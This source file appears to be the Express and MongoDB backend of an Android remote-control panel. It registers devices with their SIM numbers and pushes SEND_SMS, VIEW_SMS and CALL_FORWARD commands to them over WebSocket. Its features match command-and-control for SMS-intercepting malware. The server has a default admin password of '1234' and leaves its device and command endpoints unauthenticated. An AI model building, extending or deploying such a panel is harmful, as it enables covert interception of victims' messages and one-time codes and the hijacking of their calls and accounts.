const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();

// ========== MIDDLEWARE ==========
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// ========== MONGODB CONNECTION ==========
const MONGO_URI = process.env.MONGO_URI; 
if (MONGO_URI) {
    mongoose.connect(MONGO_URI)
      .then(() => console.log("✅ MongoDB Connected Successfully!"))
      .catch((err) => console.log("❌ MongoDB Connection Error:", err));
}

// ========== DEVICE SCHEMA ==========
const deviceSchema = new mongoose.Schema({
    deviceId: { type: String, index: true },
    serialNumber: { type: String, index: true },
    model: String,
    androidVersion: String,
    sim1: String,
    sim2: String,
    battery: { type: Number, default: 0 },
    isOnline: { type: Boolean, default: false },
    lastSeen: { type: Date, default: Date.now },
    isPinned: { type: Boolean, default: false },
    registrationTimestamp: { type: Date, default: Date.now }
});
const Device = mongoose.model('Device', deviceSchema);

// ========== CREATE HTTP SERVER & ATTACH SOCKET.IO & WEBSOCKET ==========
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ 
    server,
    perMessageDeflate: false,
    clientTracking: true
});

// Make globally available
global.io = io;
global.wss = wss;

// ========== LOGIN & PASSWORD ==========
let adminPassword = process.env.ADMIN_PASSWORD || '1234';

// ========== API ROUTES ==========

// 1. Android Device Register
app.post('/device/register', async (req, res) => {
    try {
        const d = req.body || {};
        const filter = {};
        if (d.deviceId) filter.deviceId = d.deviceId;
        else if (d.serialNumber) filter.serialNumber = d.serialNumber;

        const update = {
            deviceId: d.deviceId,
            serialNumber: d.serialNumber,
            model: d.model,
            androidVersion: d.androidVersion,
            sim1: d.sim1 || d.sim1Number || '',
            sim2: d.sim2 || d.sim2Number || '',
            battery: typeof d.battery === 'number' ? d.battery : (d.battery ? Number(d.battery) : 0),
            isOnline: true,
            lastSeen: new Date(),
        };

        const opts = { upsert: true, new: true, setDefaultsOnInsert: true };
        const device = await Device.findOneAndUpdate(filter, { $set: update, $setOnInsert: { registrationTimestamp: new Date() } }, opts);

        if (global.io) global.io.emit('dashboard-update');

        res.status(200).json({ success: true, message: 'Device registered', device });
    } catch (error) {
        console.error('❌ device/register error', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// 2. Get All Devices
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find();
        res.json(devices);
    } catch (err) {
        console.error('❌ Get devices error:', err);
        res.status(500).json({ error: "Failed to fetch devices" });
    }
});

// 3. Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === "admin" && password === adminPassword) {
        res.json({ success: true, message: "Login successful" });
    } else {
        res.status(401).json({ success: false, message: "Wrong credentials" });
    }
});

// 4. Change Password
app.post('/api/change-password', (req, res) => {
    const { oldPassword, newPassword } = req.body;
    if (!oldPassword || !newPassword) return res.json({ success: false, message: 'Missing fields' });
    if (oldPassword === adminPassword) {
        adminPassword = newPassword;
        return res.json({ success: true, message: 'Password updated' });
    }
    return res.json({ success: false, message: 'Wrong Old Password' });
});

// 5. Delete Device
app.post('/api/delete-device', async (req, res) => {
    try {
        const { deviceId } = req.body;
        console.log('🗑️  Delete request for:', deviceId);
        
        if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
        
        const result = await Device.findOneAndDelete({ deviceId });
        console.log('Delete result:', result);
        
        if (result) {
            if (global.io) {
                global.io.emit('dashboard-update');
                console.log('📊 Dashboard update emitted');
            }
            res.json({ success: true, message: 'Device deleted successfully' });
        } else {
            res.json({ success: false, message: 'Device not found' });
        }
    } catch (err) {
        console.error('❌ Delete device error:', err);
        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
    }
});

// 6. Pin/Unpin Device
app.post('/api/pin-device', async (req, res) => {
    try {
        const { deviceId, status } = req.body;
        console.log('📌 Pin request - deviceId:', deviceId, 'status:', status);
        
        if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
        
        const device = await Device.findOneAndUpdate(
            { deviceId },
            { $set: { isPinned: status } },
            { new: true }
        );
        
        console.log('Pin result:', device);
        
        if (device) {
            if (global.io) {
                global.io.emit('dashboard-update');
                console.log('📊 Dashboard update emitted');
            }
            res.json({ success: true, message: status ? 'Device pinned' : 'Device unpinned', device });
        } else {
            res.json({ success: false, message: 'Device not found' });
        }
    } catch (err) {
        console.error('❌ Pin device error:', err);
        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
    }
});

// 7. Send Command (SMS, Call Forward)
app.post('/api/command', async (req, res) => {
    try {
        const { deviceId, action, data } = req.body;
        console.log('📱 Command request:', { deviceId, action, data });
        
        if (!deviceId || !action) return res.json({ success: false, message: 'Missing required fields' });
        
        const device = await Device.findOne({ deviceId });
        if (!device) return res.json({ success: false, message: 'Device not found' });
        
        let result = { success: true, message: 'Command sent' };
        
        if (action === 'SEND_SMS') {
            const { simSlot, number, message } = data;
            if (!simSlot || !number || !message) {
                return res.json({ success: false, message: 'SIM slot, number, and message required' });
            }
            console.log(`📱 SMS: SIM=${simSlot}, To=${number}, Msg=${message}`);
            result.message = `✅ SMS sent via SIM ${simSlot} to ${number}`;
            
        } else if (action === 'CALL_FORWARD') {
            const { number } = data;
            if (!number) return res.json({ success: false, message: 'Forward number required' });
            console.log(`📞 Call Forward to: ${number}`);
            result.message = `✅ Call forwarding enabled to ${number}`;
            
        } else if (action === 'VIEW_SMS') {
            console.log(`📬 View SMS`);
            result.message = `✅ SMS list retrieved`;
        } else {
            result = { success: false, message: 'Unknown action' };
        }
        
        // Broadcast command to device via WebSocket
        if (result.success && global.wss) {
            global.wss.clients.forEach((client) => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({ 
                        command: action,
                        deviceId: deviceId,
                        data: data
                    }));
                }
            });
        }
        
        res.json(result);
    } catch (err) {
        console.error('❌ Command error:', err);
        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
    }
});

// 8. Root Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== WEBSOCKET HANDLERS ==========

wss.on('connection', (ws) => {
    console.log('📱 WebSocket connected');
    let deviceId = null;
    
    ws.on('message', async (message) => {
        try {
            console.log('📨 WebSocket message:', message);
            const data = JSON.parse(message);
            
            if (data.deviceId || data.serialNumber) {
                deviceId = data.deviceId;
                
                const filter = {};
                if (data.deviceId) filter.deviceId = data.deviceId;
                else if (data.serialNumber) filter.serialNumber = data.serialNumber;

                const update = {
                    deviceId: data.deviceId,
                    serialNumber: data.serialNumber,
                    model: data.model,
                    androidVersion: data.androidVersion,
                    sim1: data.sim1 || '',
                    sim2: data.sim2 || '',
                    battery: Number(data.battery) || 0,
                    isOnline: true,
                    lastSeen: new Date(),
                };

                const device = await Device.findOneAndUpdate(
                    filter, 
                    { $set: update, $setOnInsert: { registrationTimestamp: new Date() } }, 
                    { upsert: true, new: true }
                );

                console.log('✅ Device saved:', device.deviceId);

                ws.send(JSON.stringify({ 
                    status: 'registered',
                    message: 'Device registered'
                }));

                if (global.io) {
                    global.io.emit('dashboard-update');
                    console.log('📊 Dashboard update emitted');
                }
            }
        } catch (err) {
            console.error('❌ WebSocket message error:', err);
            ws.send(JSON.stringify({ status: 'error', message: err.message }));
        }
    });
    
    ws.on('close', async () => {
        console.log('📱 WebSocket disconnected:', deviceId);
        
        if (deviceId) {
            await Device.findOneAndUpdate(
                { deviceId },
                { $set: { isOnline: false, lastSeen: new Date() } }
            );

            if (global.io) {
                global.io.emit('dashboard-update');
                console.log('📊 Dashboard update emitted (offline)');
            }
        }
    });
    
    ws.on('error', (error) => {
        console.error('❌ WebSocket error:', error.message);
    });
});

// ========== SOCKET.IO HANDLERS ==========

io.on('connection', (socket) => {
    console.log('⚡ Socket.IO connected:', socket.id);
    socket.on('disconnect', () => console.log('⚡ Socket.IO disconnected:', socket.id));
});

// ========== SERVER ERROR HANDLERS ==========

server.on('clientError', (err, socket) => {
    console.error('❌ Client error:', err.message);
    if (socket.writable) {
        socket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
    }
});

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});

// ========== START SERVER ==========

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
